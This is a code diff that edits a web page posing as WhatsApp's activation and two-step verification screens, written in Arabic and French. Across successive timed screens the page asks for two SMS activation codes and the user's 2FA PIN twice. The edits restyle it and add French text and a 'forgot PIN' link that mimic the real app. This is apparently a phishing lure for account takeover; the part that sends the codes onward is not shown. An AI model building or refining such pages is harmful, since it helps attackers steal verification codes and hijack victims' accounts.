@@ -11,43 +11,36 @@
             font-family: 'Arial', sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #FAF3E7;
+            background-color: #FFFFFF;
             display: flex;
             flex-direction: column;
-            align-items: center;
             justify-content: center;
-            min-height: 100vh;
+            align-items: center;
+            height: 100vh;
             text-align: center;
         }
 
         .container {
-            background-color: white;
-            border-radius: 10px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
             padding: 20px;
+            text-align: center;
             width: 90%;
             max-width: 400px;
         }
 
-        .container img {
-            width: 50px;
-            margin-bottom: 20px;
-        }
-
         h1 {
-            font-size: 20px;
-            color: #333;
+            font-size: 24px;
+            color: #333333;
             margin-bottom: 10px;
         }
 
         p {
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 15px;
+            font-size: 16px;
+            color: #666666;
+            margin-bottom: 20px;
         }
 
         .pin-input {
-            font-size: 20px;
+            font-size: 24px;
             letter-spacing: 10px;
             width: calc(1.5em * 6);
             border: none;
@@ -56,7 +49,7 @@
             margin-bottom: 15px;
             padding: 5px 0;
             outline: none;
-            color: #333;
+            color: #333333;
         }
 
         .pin-input:focus {
@@ -80,9 +73,21 @@
         }
 
         .instruction {
-            font-size: 12px;
-            color: #999;
-            margin-top: 10px;
+            font-size: 14px;
+            color: #999999;
+            margin-top: 15px;
+        }
+
+        .forgot-link {
+            color: #25D366;
+            font-size: 16px;
+            text-decoration: none;
+            margin-top: 15px;
+            display: inline-block;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
         }
 
         #countdown {
@@ -90,24 +95,11 @@
             font-weight: bold;
             margin-top: 10px;
         }
-
-        .forgot-link {
-            color: #25D366;
-            font-size: 14px;
-            text-decoration: none;
-            margin-top: 10px;
-            display: block;
-        }
-
-        .forgot-link:hover {
-            text-decoration: underline;
-        }
     </style>
 </head>
 
 <body>
     <div class="container" id="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
         <h1>رمز التفعيل</h1>
         <p>يرجى إدخال رمز التفعيل المكون من 6 أرقام الذي تلقيته عبر رسالة نصية.</p>
         <input id="activationCode1" class="pin-input" type="password" maxlength="6" placeholder="••••••">
@@ -165,7 +157,6 @@
             startCountdown(() => {
                 const container = document.getElementById('container');
                 container.innerHTML = `
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
                     <h1>رمز التفعيل الثاني</h1>
                     <p>يرجى إدخال رمز التفعيل الثاني المكون من 6 أرقام.</p>
                     <input id="activationCode2" class="pin-input" type="password" maxlength="6" placeholder="••••••">
@@ -188,10 +179,13 @@
             startCountdown(() => {
                 const container = document.getElementById('container');
                 container.innerHTML = `
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
-                    <h1>رمز PIN</h1>
-                    <p>يرجى إدخال رمز PIN المكون من 6 أرقام الذي قمت بإعداده مسبقًا لتأكيد الانضمام.</p>
+                    <h1>Vérification en deux étapes</h1>
+                    <p>Saisissez le code PIN que vous avez créé lors de la configuration de la vérification en deux étapes.</p>
                     <input id="pinCode1" class="pin-input" type="password" maxlength="6" placeholder="••••••">
+                    <a href="#" class="forgot-link">PIN oublié ?</a>
+                    <p class="instruction">
+                        Vous avez vous-même créé votre code PIN. Il ne s'agit pas du code de vérification que vous avez reçu lors de votre inscription.
+                    </p>
                     <button onclick="submitFirstPin()">متابعة</button>
                     <div id="countdown"></div>
                 `;
@@ -211,7 +205,6 @@
             startCountdown(() => {
                 const container = document.getElementById('container');
                 container.innerHTML = `
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
                     <h1>إعادة رمز PIN</h1>
                     <p>يرجى إعادة إدخال رمز PIN المكون من 6 أرقام لتأكيد الدخول.</p>
                     <input id="pinCode2" class="pin-input" type="password" maxlength="6" placeholder="••••••">
